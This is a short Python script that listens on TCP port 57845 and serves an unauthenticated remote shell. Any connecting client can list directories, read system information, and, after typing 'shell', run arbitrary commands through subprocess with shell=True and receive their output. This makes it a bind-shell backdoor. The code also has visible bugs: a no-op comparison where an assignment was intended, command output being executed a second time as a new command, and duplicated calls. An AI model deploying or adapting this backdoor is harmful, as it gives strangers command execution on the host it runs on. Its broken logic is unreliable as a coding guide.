import socket,subprocess
import os,sys

#options from order
MENU={
str.encode("pwd"):os.getcwd(), #or for bytes operation use --> os.getcwdb()
str.encode("ls_dir"):os.listdir(path=None), #describe path list
str.encode("uname"):os.uname() #same uname-a
}
#mark socket
host = ''
port = 57845

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((host,port))
s.listen(1)
#show connection
conn, adress = s.accept()
print ("connection accept:",adress)

on = True
#function catch entry by client and verify if have present in MENU
def check(entry,menu):
	msg = ""
	quanty_entry = len(entry.split())
	arguments = " ".join(bytes.decode(entry).split()[1:]) if quanty_entry > 1 else " "
	for x in MENU:
		if entry == x and quanty_entry == 1:
        		msg = MENU[x]
		elif quanty_entry > 1:
			msg = os.listdir(f"{arguments}")
		else:
			msg == "invalid"
		print("msg-->",msg,"\t","arguments-->",arguments)
	return msg

#loop running socket
while on:

	print("Aguardando pedido\n")
	get = conn.recv(1024)
	print("get = ",get.split())
	if(get == b"exit"):
		conn.close()
		on = False
		sys.exit()
	if(get == b"shell"):
		while(get != b"exit"):
			conn.send(b"\nWelcolme to shell\nInput Your Command --> ")
			get = conn.recv(1024)

			def cmd(data):
				sub = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE,stderr = subprocess.PIPE, stdin=subprocess.PIPE,universal_newlines=True)
				output = sub.stdout.read()+sub.stderr.read()
				return output

			def format(info):
				return ("".join([a for a in cmd(info)]))

			conn.send(str.encode(format(cmd(get))))

	response = check(get,MENU) if check(get,MENU) != "invalid" else "entrada invalida"
	conn.send(str.encode("".join([i for i in response])))


""" função para envia comando e print -->a

def cmd(data):
     sub = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     output = sub.stderr.read()+sub.stdout.read()
     return output

def printa(info):
     print("".join([a for a in bytes.decode(cmd(info))]))
"""
